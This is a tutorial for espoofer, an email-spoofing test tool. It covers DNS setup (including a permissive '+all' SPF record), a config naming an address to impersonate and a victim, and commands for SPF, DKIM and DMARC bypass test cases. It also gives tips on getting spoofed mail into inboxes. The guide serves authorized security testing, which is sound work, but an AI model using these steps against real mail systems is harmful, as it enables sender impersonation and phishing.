# Espoofer In-Depth Tutorial Guide

This guide provides detailed instructions on setting up and using espoofer for email authentication testing.

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Installation](#installation)
3. [Domain Configuration](#domain-configuration)
4. [Operating Modes](#operating-modes)
5. [Test Cases](#test-cases)
6. [Troubleshooting](#troubleshooting)

## Prerequisites

Before starting, ensure you have:

- Python 3.7 or higher installed
- A domain name (e.g., security-testing.pt)
- A server with:
  - Port 25 open (not blocked by ISP)
  - Static IP address
  - Proper PTR record (reverse DNS) configured
  - Not listed in spam blacklists

## Installation

1. Clone the repository:
```bash
git clone https://github.com/chenjj/espoofer
cd espoofer
```

2. Install dependencies:
```bash
pip3 install -r requirements.txt
```

## Domain Configuration

### 1. DNS Records Setup

#### DKIM Configuration
Add this TXT record to your domain:
```
selector._domainkey.YOUR_DOMAIN TXT "v=DKIM1; k=rsa; t=y; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNjwdrmp/gcbKLaGQfRZk+LJ6XOWuQXkAOa/lI1En4t4sLuWiKiL6hACqMrsKQ8XfgqN76mmx4CHWn2VqVewFh7QTvshGLywWwrAJZdQ4KTlfR/2EwAlrItndijOfr2tpZRgP0nTY6saktkhQdwrk3U0SZmG7U8L9IPj7ZwPKGvQIDAQAB"
```

#### SPF Configuration
Add this TXT record:
```
YOUR_DOMAIN TXT "v=spf1 ip4:YOUR_SERVER_IP +all"
```

### 2. Tool Configuration

Edit `config.py` with your settings:

```python
config = {
    "attacker_site": b"your-domain.com",  # Your attack domain
    "legitimate_site_address": b"admin@target.com",  # Address to impersonate
    "victim_address": b"victim@victim.com",  # Target recipient
    "case_id": b"server_a1",  # Test case to use
    
    "server_mode": {
        "recv_mail_server": "",  # Leave empty to auto-detect
        "recv_mail_server_port": 25,
        "starttls": False,
    }
}
```

## Operating Modes

### 1. Server Mode (Default)
Tests receiving service validation. Used when simulating an attacker server.

```bash
# Basic usage
python3 espoofer.py

# With specific test case
python3 espoofer.py -id server_a1

# With STARTTLS
python3 espoofer.py -tls
```

### 2. Client Mode
Tests sending service validation. Used when you have credentials on the target email service.

```bash
# Configure client_mode in config.py first:
"client_mode": {
    "sending_server": ("smtp.gmail.com", 587),
    "username": b"your-email@gmail.com",
    "password": b"your-password"
}

# Run in client mode
python3 espoofer.py -m c -id client_a1
```

### 3. Manual Mode
For advanced testing and debugging.

```bash
python3 espoofer.py -m m \
    -helo your-domain.com \
    -mfrom <sender@your-domain.com> \
    -rcptto <victim@target.com> \
    -data "Your raw email content" \
    -ip target.smtp.server \
    -port 25
```

## Test Cases

List all available test cases:
```bash
python3 espoofer.py -l
```

View details of a specific test case:
```bash
python3 espoofer.py -l case_id
```

Common test cases:
- `server_a1`: Basic SPF bypass
- `server_a2`: DKIM bypass
- `server_a3`: DMARC bypass
- `client_a1`: Client-side authentication bypass

## Troubleshooting

### 1. Email Delivery Issues

If emails fail to send:
1. Check if port 25 is blocked by your ISP
2. Verify your IP is not in spam lists (check spamhaus.org/lookup)
3. Confirm PTR record is properly set
4. Try different test cases

### 2. Spam Folder Issues

To improve inbox delivery:
1. Use a reputable IP address
2. Set up proper reverse DNS
3. Use legitimate-looking content
4. Ensure all authentication records are properly configured

### 3. DNS Configuration

Verify your DNS records:
```bash
# Check DKIM record
dig selector._domainkey.your-domain.com TXT

# Check SPF record
dig your-domain.com TXT
```

### 4. Common Errors

1. "case_id not found in testcases":
   - Use `-l` to list valid case IDs
   - Ensure case_id matches your mode (server/client)

2. "mail server cannot be resolved":
   - Set recv_mail_server manually in config.py
   - Check DNS resolution for target domain

3. SMTP connection errors:
   - Verify port 25 is open
   - Check if target server requires STARTTLS (-tls option)

## Best Practices

1. Always start with basic test cases before advanced ones
2. Document all successful and failed attempts
3. Use different test cases for different authentication mechanisms
4. Monitor email headers to verify authentication results
5. Keep your IP and domain reputation clean

## Security Considerations

1. Only use on authorized systems and domains
2. Document all testing activities
3. Follow responsible disclosure practices
4. Monitor for system responses and blocks
5. Respect rate limits and server policies

## Additional Resources

- [Project Repository](https://github.com/chenjj/espoofer)
- [DMARC RFC](https://tools.ietf.org/html/rfc7489)
- [SPF RFC](https://tools.ietf.org/html/rfc7208)
- [DKIM RFC](https://tools.ietf.org/html/rfc6376) 